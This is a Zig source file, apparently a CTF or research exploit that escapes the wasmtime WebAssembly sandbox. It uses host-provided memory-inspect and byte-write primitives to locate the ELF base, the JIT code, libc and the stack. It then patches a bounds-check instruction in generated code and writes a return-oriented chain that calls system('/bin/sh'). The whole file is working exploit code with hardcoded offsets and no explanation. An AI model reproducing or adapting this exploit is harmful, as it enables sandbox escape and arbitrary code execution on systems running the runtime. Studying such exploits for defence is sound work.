extern fn inspect(addr: i64) i64;
extern fn write_byte_where(addr: i64, b: i32) void;

inline fn insp(addr: anytype) i64 {
    return inspect(@intCast(addr));
}

const MemLocations = struct {
    elf: u64,
    module_offset: u64, // used to calculate the address we target in our write.
    xgen: u64,
    libc: u64,
    argv: u64,
};

const PAGE_SIZE = 0x1000;
const ELF_BASE_GUESS = 0x550000000000;

// Executable offsets needed
const LIBC_SYSTEM_OFFSET = 0x58740;
const LIBC_POP_RDI_OFFSET = 0x10f75b;
const LIBC_BINSH_OFFSET = 0x1cb42f;
const LIBC_START_MAIN_OFFSET = 0x2a200;
// For finding the return pointer on the stack
const LIBC_TARGET_RET = 0x2a1ca;

const ELF_GOT_LIBC_START_MAIN_OFFSET = 0x8b3e88;
const ELF_ARGV_STACK_PTR_ELF_OFFSET = 0x8b4680;
// (wasmtime::runtime::module::registry::global_code::GLOBAL_CODE+24)
const ELF_HEAP_TO_CODE_OFFSET = 0x8b4188;

fn find_memory_regions() MemLocations {
    var mem = MemLocations{
        .elf = 0,
        .module_offset = 0,
        .xgen = 0,
        .libc = 0,
        .argv = 0,
    };

    var curr: u64 = 0;
    for (0..0x1000000000) |i| {
        const addr = ELF_BASE_GUESS + i * (0x200 * PAGE_SIZE);
        const ret = insp(addr);
        if (ret >= 0) {
            curr = addr;
            break;
        }
    }

    // go upwards via page size to find the ELF base
    for (0..0x2000) |i| {
        const addr = curr - i * PAGE_SIZE;
        const ret = insp(addr);
        if (ret == -1) {
            curr = addr + PAGE_SIZE;
            break;
        }
    }

    mem.elf = curr;

    const heap_xgen: u64 = @intCast(insp(mem.elf + ELF_HEAP_TO_CODE_OFFSET));
    if (heap_xgen < mem.elf) {
        return mem;
    }

    var heap_start = heap_xgen & ~@as(u64, PAGE_SIZE - 1);
    for (0..0x10000) |_| {
        const ret = insp(heap_start - PAGE_SIZE);
        if (ret == -1) {
            break;
        }
        heap_start -= PAGE_SIZE;
    }

    var lowest_dyn: u64 = 0x7ffff0000000;
    for (0..(0x41000 / 8)) |i| {
        const addr: u64 = heap_start + i * 8;
        const ret = insp(addr);
        if (ret < 0) {
            continue;
        }

        if (ret > 0x7f0000000000 and ret < 0x7fffff000000) {
            const ret2 = insp(ret);
            if (ret2 == 0x08578b4ce5894855) {
                mem.xgen = @intCast(ret);
            }
        }

        const val: u64 = @intCast(ret);
        _ = insp(val); // dummy
        if (val > 0x7f0000000000 and val < lowest_dyn) {
            if (insp(val) != 0) {
                continue;
            }

            lowest_dyn = val;
        }
    }

    if (lowest_dyn == 0x7ffff0000000) {
        return mem;
    }

    _ = insp(lowest_dyn); // dummy

    mem.module_offset = lowest_dyn;

    if (mem.xgen < 0x7f0000000000 or mem.xgen > 0x7fffff000000) {
        mem.xgen = 0;
        return mem;
    }

    const libc: u64 = @intCast(insp(mem.elf + ELF_GOT_LIBC_START_MAIN_OFFSET));
    if (libc < 0x7f0000000000) {
        return mem;
    }

    mem.libc = libc - LIBC_START_MAIN_OFFSET;

    mem.argv = @intCast(insp(mem.elf + ELF_ARGV_STACK_PTR_ELF_OFFSET));
    if (mem.argv < 0x7f0000000000) {
        return mem;
    }

    return mem;
}

noinline fn victim(addr: u64, val: u64) void {
    const write_addr: *u64 = @ptrFromInt(addr);
    _ = insp(addr); // dummy just to make the function a bit easier to spot
    write_addr.* = val;
}

const MARKER = 0x42424242;
fn find_victim(mem: MemLocations) i64 {
    var found_ourselfs = false;
    for (0..0x10000) |i| {
        const addr = mem.xgen + i;
        const val = insp(addr);
        if ((val & 0xffffffff) == MARKER) {
            found_ourselfs = true;
            continue;
        } else if (found_ourselfs and (val & 0xffff == 0x470f or val & 0xffff == 0x430f)) { // find cmova/cmovae
            if (val & 0xff0000 == 0) {
                // This is our own check
                continue;
            }
            return @intCast(addr);
        }
    }
    return 0;
}

export fn entry() callconv(.C) i32 {
    // dummy call
    //
    var buffer: [0x100]u64 = undefined;
    for (0..0x100) |i| {
        victim(@intFromPtr(&buffer[i]), i);
    }
    //

    const mem = find_memory_regions();
    if (mem.elf == 0) {
        return -1;
    }

    if (mem.module_offset == 0) {
        return -2;
    }

    if (mem.xgen == 0) {
        return -3;
    }

    if (mem.libc == 0) {
        return -4;
    }

    if (mem.argv == 0) {
        return -5;
    }

    const victim_addr = find_victim(mem);
    if (victim_addr == 0) {
        return -6;
    }

    const rip_address = mem.argv - 0x120;

    if (rip_address == 0) {
        return -7;
    }

    write_byte_where(@intCast(victim_addr + 2), 0xc2);

    // write rop
    victim(rip_address - mem.module_offset, mem.libc + LIBC_POP_RDI_OFFSET);
    victim(rip_address - mem.module_offset + 8, mem.libc + LIBC_BINSH_OFFSET);
    victim(rip_address - mem.module_offset + 0x10, mem.libc + LIBC_POP_RDI_OFFSET + 1); // ret for alignment
    victim(rip_address - mem.module_offset + 0x18, mem.libc + LIBC_SYSTEM_OFFSET);

    return 1234;
}
